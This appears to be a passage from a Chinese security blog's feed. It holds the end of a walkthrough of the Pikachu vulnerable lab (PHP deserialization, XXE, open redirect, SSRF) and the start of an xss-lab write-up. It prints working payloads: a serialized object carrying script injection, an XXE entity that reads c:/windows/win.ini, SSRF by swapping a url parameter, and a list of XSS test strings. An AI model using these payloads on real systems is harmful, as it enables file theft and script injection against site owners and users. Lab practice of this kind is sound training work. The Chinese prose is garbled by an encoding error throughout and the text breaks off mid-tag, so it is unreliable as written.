testï¼Œåœ¨ç±»testä¸­å®šä¹‰ä¸¤ä¸ªå±æ€§nameå’Œmoneyï¼›åˆ›å»ºå¯¹è±¡aï¼Œå¹¶å°†å…¶åºåˆ—åŒ–ï¼›è¾“å‡ºåºåˆ—åŒ–ç»“æœã€‚</p><p><img src="https://i.loli.net/2021/02/14/vT2wkJGmtdHYpDU.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;money&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;verymuch&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>oï¼šå¯¹è±¡objectï¼›4ï¼šä¸ºtesté•¿åº¦ï¼›2ï¼šä¸º{}å†…å±æ€§ä¸ªæ•°ï¼›</p><p>{}å†…ä¸ºå¯¹è±¡çš„å±æ€§ï¼›sï¼šè¡¨ç¤ºç±»å‹ä¸ºå­—ç¬¦ä¸²stringï¼›4ï¼šè¡¨ç¤ºå±æ€§åé•¿åº¦ï¼›â€nameâ€ä¸ºå±æ€§åï¼›éšåsã€2ä¸€æ ·ï¼›â€lsâ€ä¸ºå±æ€§nameçš„å€¼ï¼›</p><p>å³ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">obejectï¼šå¯¹è±¡åé•¿åº¦ï¼š<span class="hljs-string">&quot;å¯¹è±¡å&quot;</span>ï¼šå±æ€§ä¸ªæ•°&#123;å±æ€§ç±»å‹ï¼šå±æ€§åé•¿åº¦ï¼š<span class="hljs-string">&quot;å±æ€§å&quot;</span>ï¼›å±æ€§å€¼ç±»å‹ï¼šå±æ€§å€¼é•¿åº¦ï¼š<span class="hljs-string">&quot;å±æ€§å€¼&quot;</span>.....&#125;<br></code></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æ¼æ´ä¸é­”æ³•å‡½æ•°æœ‰å¤§å…³è”~~</p><blockquote><p><code>__construct</code>å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è°ƒç”¨ï¼ˆconstructorï¼‰ï¼›<br><code>__destruct</code>å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨ï¼ˆdestructorï¼‰ï¼›<br><code>__toString</code>å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ä½¿ç”¨ï¼›<br><code>__sleep</code>å½“å¯¹ä¸€ä¸ªå¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ï¼›<br><code>__wakeup</code>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œphpå°±ä¼šè°ƒç”¨<code>__wakeup</code>æ–¹æ³•ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ï¼›</p></blockquote><table><thead><tr><th>é­”æ³•å‡½æ•°ï¼š</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td>__construct()</td><td align="center">ç±»çš„æ„é€ å‡½æ•°</td></tr><tr><td>__destruct()</td><td align="center">ç±»çš„ææ„å‡½æ•°</td></tr><tr><td>__call()</td><td align="center">åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</td></tr><tr><td>__callStatic()</td><td align="center">ç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</td></tr><tr><td>__get()</td><td align="center">è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</td></tr><tr><td>__set()</td><td align="center">è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</td></tr><tr><td>__isset()</td><td align="center">å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</td></tr><tr><td>__unset()</td><td align="center">å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨</td></tr><tr><td>__sleep()</td><td align="center">æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</td></tr><tr><td>__wakeup()</td><td align="center">æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</td></tr><tr><td>__toString()</td><td align="center">ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</td></tr><tr><td>__invoke()</td><td align="center">è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</td></tr><tr><td>__set_state()</td><td align="center">è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨</td></tr><tr><td>__clone</td><td align="center">å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</td></tr><tr><td>__autoload()</td><td align="center">å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</td></tr><tr><td>__debugInfo()</td><td align="center">æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</td></tr></tbody></table><p>æ¥å—åºåˆ—åŒ–æ•°æ®ï¼Œå¹¶å°†å…¶ååºåˆ—åŒ–</p><p><img src="https://i.loli.net/2021/02/14/vhR5pwWGieZ4ack.png"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;pikachu&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">#æ­¤å¤„é­”æ³•å‡½æ•°è¢«é‡æ–°ï¼Œè®¾å®šç›´æ¥è¾“å‡ºtestå†…å®¹</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;o&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;o&#x27;</span>];<span class="hljs-comment">#ä»¥postçš„æ–¹å¼ä¼ å‚ç»™$o</span><br>    <span class="hljs-keyword">if</span>(!@<span class="hljs-variable">$unser</span> = unserialize(<span class="hljs-variable">$s</span>))&#123;<span class="hljs-comment">#èµ‹å€¼ç»™$unserï¼›@æ— å›æ˜¾ï¼›</span><br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;å¤§å…„å¼Ÿ,æ¥ç‚¹åŠ²çˆ†ç‚¹å„¿çš„!&lt;/p&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;<span class="hljs-comment">#èµ‹å€¼æˆåŠŸåˆ™å°†å…¶ååºåˆ—åŒ–å¹¶ä½œä¸ºpæ ‡ç­¾è¿”å›</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤å¤„ä¼šè¾“å‡º$sååºåˆ—åŒ–åçš„å€¼(æ— waf)ï¼Œåˆ™æäº¤ä¸€ä¸ªåºåˆ—åŒ–å‚æ•°=ã€‹ååºåˆ—åŒ–=ã€‹åºåˆ—åŒ–å‰çš„å€¼</p><p>ç”±æ­¤æ„é€ payload(xss)ï¼š</p><p><img src="https://i.loli.net/2021/02/14/xDzmHyfnXh1McJu.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;&lt;script&gt;alert(111)&lt;/script&gt;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>æ”¾è¿›å»å°±è¡Œå•¦</p><p><img src="https://i.loli.net/2021/02/14/ZChqMt43TzxGs5y.png"></p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><blockquote><p>XXE -â€œxml external entity injectionâ€å³â€xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´â€ã€‚</p><p>æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜ï¼Œ<br>ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</p><p>ç”±äºç¨‹åºåœ¨è§£æè¾“å…¥çš„XMLæ•°æ®æ—¶ï¼Œè§£æäº†æ”»å‡»è€…ä¼ªé€ çš„å¤–éƒ¨å®ä½“è€Œäº§ç”Ÿçš„</p></blockquote><p>åŸºæœ¬çš„payloadç»“æ„ï¼š</p><p><img src="https://i.loli.net/2021/02/14/oPEhW9IDKQUZxJ6.jpg"></p><p>egï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; <br>&lt;!DOCTYPE a [<br>&lt;!ENTITY d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;<br>]&gt;<br>&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;<br></code></pre></td></tr></table></figure><blockquote><p><strong>xmlæ–‡æ¡£å£°æ˜ç»“æ„</strong></p><p>egï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>l  versionå±æ€§ï¼šç”¨äºè¯´æ˜å½“å‰xmlæ–‡æ¡£çš„ç‰ˆæœ¬ï¼Œå› ä¸ºéƒ½æ˜¯åœ¨ç”¨1.0ï¼Œæ‰€ä»¥è¿™ä¸ªå±æ€§å€¼å¤§å®¶éƒ½å†™1.0ï¼Œversionå±æ€§æ˜¯å¿…é¡»çš„ï¼›</strong></p><p><strong>l  encodingå±æ€§ï¼šç”¨äºè¯´æ˜å½“å‰xmlæ–‡æ¡£ä½¿ç”¨çš„å­—ç¬¦ç¼–ç é›†ï¼Œxmlè§£æå™¨ä¼šä½¿ç”¨è¿™ä¸ªç¼–ç æ¥è§£æxmlæ–‡æ¡£ã€‚encodingå±æ€§æ˜¯å¯é€‰çš„ï¼Œé»˜è®¤ä¸ºUTF-8ã€‚æ³¨æ„ï¼Œå¦‚æœå½“å‰xmlæ–‡æ¡£ä½¿ç”¨çš„å­—ç¬¦ç¼–ç é›†æ˜¯gb2312ï¼Œè€Œencodingå±æ€§çš„å€¼ä¸ºUTF-8ï¼Œé‚£ä¹ˆä¸€å®šä¼šå‡ºé”™çš„ï¼›</strong></p><p><strong>l  standaloneå±æ€§ï¼šç”¨äºè¯´æ˜å½“å‰xmlæ–‡æ¡£æ˜¯å¦ä¸ºç‹¬ç«‹æ–‡æ¡£ï¼Œå¦‚æœè¯¥å±æ€§å€¼ä¸ºyesï¼Œè¡¨ç¤ºå½“å‰xmlæ–‡æ¡£æ˜¯ç‹¬ç«‹çš„ï¼Œå¦‚æœä¸ºnoè¡¨ç¤ºå½“å‰xmlæ–‡æ¡£ä¸æ˜¯ç‹¬ç«‹çš„ï¼Œå³ä¾èµ–å¤–éƒ¨çš„çº¦æŸæ–‡ä»¶ã€‚é»˜è®¤æ˜¯yes</strong></p><p><strong>l  æ²¡æœ‰xmlæ–‡æ¡£å£°æ˜çš„xmlæ–‡æ¡£ï¼Œä¸æ˜¯æ ¼å¼è‰¯å¥½çš„xmlæ–‡æ¡£ï¼›</strong></p><p><strong>l  xmlæ–‡æ¡£å£°æ˜å¿…é¡»ä»xmlæ–‡æ¡£çš„1è¡Œ1åˆ—å¼€å§‹ã€‚</strong></p></blockquote><blockquote><p><strong>DTDå®ä½“:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">ä¸€èˆ¬å®ä½“çš„å£°æ˜ï¼š<span class="hljs-meta">&lt;!ENTITY å®ä½“åç§° <span class="hljs-meta-string">&quot;å®ä½“çš„å€¼&quot;</span>&gt;</span><br>å¼•ç”¨æ–¹æ³•ï¼š&amp;å®ä½“åç§°;<br>p.s.å¯åœ¨DTDã€XMLã€å£°æ˜å‰ä»¥åŠå®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚<br>å‚æ•°å®ä½“çš„å£°æ˜ï¼š<span class="hljs-meta">&lt;!ENTITY % å®ä½“åç§° <span class="hljs-meta-string">&quot;å®ä½“çš„å€¼&quot;</span>&gt;</span><br>å¼•ç”¨æ–¹æ³•ï¼š%å®ä½“åç§°;<br>ps:åªèƒ½åœ¨DTDTä¸­å¼•ç”¨ï¼Œä¸å¯åœ¨å£°æ˜å‰ä»¥åŠå®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨<br><br>è®°ä½â€œ&amp;â€ç¬¦å·è¦è¿›è¡Œç¼–ç <br></code></pre></td></tr></table></figure><p><strong>DTDå®ä½“å£°æ˜</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">å†…éƒ¨å®ä½“å£°æ˜ï¼š<span class="hljs-meta">&lt;!ENTITY å®ä½“åç§° <span class="hljs-meta-string">&quot;å®ä½“çš„å€¼&quot;</span>&gt;</span><br>å½“å¼•ç”¨ä¸€èˆ¬å®ä½“æ—¶ï¼Œç”±ä¸‰éƒ¨åˆ†æ„æˆï¼š&amp;ã€å®ä½“åã€ï¼›ï¼Œå½“æ˜¯ç”¨å‚æ•°ä¼ å…¥xmlçš„æ—¶å€™ï¼Œ&amp;éœ€URLç¼–ç ï¼Œä¸ç„¶&amp;ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°é—´çš„è¿æ¥ç¬¦å·ã€‚<br><br>å¤–éƒ¨å®ä½“å£°æ˜ï¼š<span class="hljs-meta">&lt;!ENTITY å®ä½“åç§° <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URI/URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p>ä½¿ç”¨æ­¤payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; <br>&lt;!DOCTYPE a [<br>&lt;!ENTITY d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;<br>]&gt;<br>&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;<br></code></pre></td></tr></table></figure><p>=&gt;<img src="https://i.loli.net/2021/02/14/mLMThdj2pk6BN4R.png"></p><p>æˆ–è€…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; <br>&lt;!DOCTYPE a [<br>&lt;!ENTITY d &quot;here has a xxe~~~&quot;&gt;<br>]&gt;<br>&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;<br></code></pre></td></tr></table></figure><p>=&gt;<img src="https://i.loli.net/2021/02/14/Tprh6UwFzlSQMB1.png"></p><h1 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h1><blockquote><p>ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚<br>å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯<br>å°±å¯èƒ½å‘ç”Ÿâ€è·³é”™å¯¹è±¡â€çš„é—®é¢˜ã€‚</p><p>urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:<br>â€“&gt;é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</p></blockquote><p>æ£€æŸ¥å…ƒç´ ï¼Œå¯ä»¥çœ‹åˆ°è·³è½¬çš„å‚æ•°ä¸ºurl=xxx</p><p><img src="https://i.loli.net/2021/02/14/8bvJB1CIqr9O4fz.png"></p><p>ä¿®æ”¹ä¸ºæƒ³è·³è½¬çš„é“¾æ¥å³å¯ï¼šå¦‚url=<a href="https://www.baidu.com/">https://www.baidu.com/</a></p><p><img src="https://i.loli.net/2021/02/14/JLBbnfIF1KCt32Z.png"></p><p>ç‚¹å‡»å°±ä¼šè·³è½¬åˆ°ç™¾åº¦é¡µé¢å•¦~</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><blockquote><p>ç”±äºæœåŠ¡ç«¯<strong>æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong>,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</p><p>å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</p><p>æ•°æ®æµ:æ”»å‡»è€…â€”â€“&gt;æœåŠ¡å™¨â€”-&gt;ç›®æ ‡åœ°å€</p><p>æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:<br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">fsockopen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">curl_exec</span><span class="hljs-params">()</span></span>     <br></code></pre></td></tr></table></figure><p>å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(â€œæˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚â€)çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,<strong>åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤</strong>ã€‚</p></blockquote><h2 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl:<br>PHP æ”¯æŒ Daniel Stenberg åˆ›å»ºçš„ libcurl åº“ï¼Œèƒ½å¤Ÿè¿æ¥é€šè®¯å„ç§æœåŠ¡å™¨ã€ä½¿ç”¨å„ç§åè®®ã€‚libcurl ç›®å‰æ”¯æŒçš„åè®®æœ‰ httpã€httpsã€ftpã€gopherã€telnetã€dictã€fileã€ldapã€‚ libcurl åŒæ—¶æ”¯æŒ HTTPS è¯ä¹¦ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (ä¹Ÿèƒ½é€šè¿‡ PHP çš„ FTP æ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookiesã€ç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚<br><br>è¯­æ³•:<br><span class="hljs-function"><span class="hljs-title">curl_init</span><span class="hljs-params">()</span></span>ï¼šåˆå§‹åŒ– cURL ä¼šè¯ã€‚<br><span class="hljs-function"><span class="hljs-title">curl_setopt</span><span class="hljs-params">()</span></span>ï¼šè®¾ç½® cURL ä¼ è¾“é€‰é¡¹ã€‚<br><span class="hljs-function"><span class="hljs-title">curl_exec</span><span class="hljs-params">()</span></span>ï¼šè¿”å› true / falseï¼Œcurl_setopt è®¾ç½®CURLOPT_RETURNTRANSFER ä¸º TRUE æ—¶å°† curl_exec() è·å–çš„ä¿¡æ¯ä»¥å­—ç¬¦ä¸²è¿”å›ã€‚<br><span class="hljs-function"><span class="hljs-title">curl_close</span><span class="hljs-params">()</span></span>ï¼šå…³é—­ cURL ä¼šè¯ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/tjmCixeIg8L75bo.png"></p><p>åŸæœ¬å¼•ç”¨è·¯å¾„çš„æ–‡ä»¶å†…å®¹(ç¼–ç åŸå› æ˜¾ç¤ºä¹±ç )</p><p><img src="https://i.loli.net/2021/02/14/JPdANaUfOqmWsyT.png"></p><p>å°†å‚æ•°urlæ›´æ”¹ä¸ºæˆ‘ä»¬è¦å¼•ç”¨çš„è·¯å¾„å³å¯</p><p><img src="https://i.loli.net/2021/02/14/8RhVbar26LuJtFZ.png"></p><h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_get_content()</span>:å°†æŒ‡å®š URL çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›ã€‚<br>file<span class="hljs-constructor">_get_contents(<span class="hljs-params">path</span>, <span class="hljs-params">include_path</span>, <span class="hljs-params">context</span>, <span class="hljs-params">start</span>, <span class="hljs-params">max_length</span>)</span><br>pathï¼šè¦è¯»å–çš„è·¯å¾„æˆ–é“¾æ¥ã€‚<br>include_pathï¼šæ˜¯å¦åœ¨è·¯å¾„ä¸­æœç´¢æ–‡ä»¶ï¼Œæœç´¢åˆ™è®¾ä¸º <span class="hljs-number">1</span>ï¼Œé»˜è®¤ä¸º <span class="hljs-literal">false</span>ã€‚<br>contextï¼šä¿®æ”¹æµçš„è¡Œä¸ºï¼Œå¦‚è¶…æ—¶æ—¶é—´ï¼ŒGET<span class="hljs-operator"> / </span>POST ç­‰ã€‚<br>startï¼šå¼€å§‹è¯»æ–‡ä»¶çš„ä½ç½®ã€‚<br>max_lengthï¼šè¯»å–æ–‡ä»¶çš„å­—èŠ‚æ•°ã€‚<br></code></pre></td></tr></table></figure><p>åŒä¸Šï¼Œåªæ˜¯åç«¯ä½¿ç”¨çš„å‡½æ•°ä¸åŒã€‚</p><p><img src="https://i.loli.net/2021/02/14/NO82jecGxVC5A4K.png"></p><p><img src="https://i.loli.net/2021/02/14/weaQTJhVq6RgpGr.png"></p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>åšäº†ä¸¤å¤©åˆ°åé¢å…¶å®æœ‰äº›åŠ›ä¸ä»å¿ƒ==ï¼Œä¸è¿‡æ€»ç®—åšå®Œäº†hh~</p><p>æŒ‰ç…§åšçš„æƒ…å†µæ¥çœ‹å¤§éƒ¨åˆ†æ¼æ´è¿˜ç®—ç†Ÿæ‚‰ï¼Œ</p><p>æ¥è§¦è¾ƒå°‘çš„æœ‰è¶Šæƒã€phpååºåˆ—åŒ–ã€SSRF</p><p>ç†è§£è¾ƒå°‘çš„æœ‰XXE</p><p>ç»§ç»­åŠªåŠ›ï¼</p>]]></content>
    
    
    <categories>
      
      <category>é¶åœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-labé€šå…³å°è®°</title>
    <link href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/"/>
    <url>/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å®é™…æ„é€ é—­åˆï¼Œå¦å¤–è¦å¯¹jsæœ‰ä¸€å®šäº†è§£</p><p>å¸¸ç”¨æµ‹è¯•è¯­å¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;<br>&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;a href=javascript:alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>urlä¸ºï¼š<a href="http://xssaq.com/yx/level1.php?name=test">http://xssaq.com/yx/level1.php?name=test</a><br>GETå‹ï¼Œæºç æ˜¾ç¤º<br>åœ¨ä¼ å‚å¤„æ’å…¥ä»£ç å³å¯ï¼š?name=<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>Urlä¸º:<a 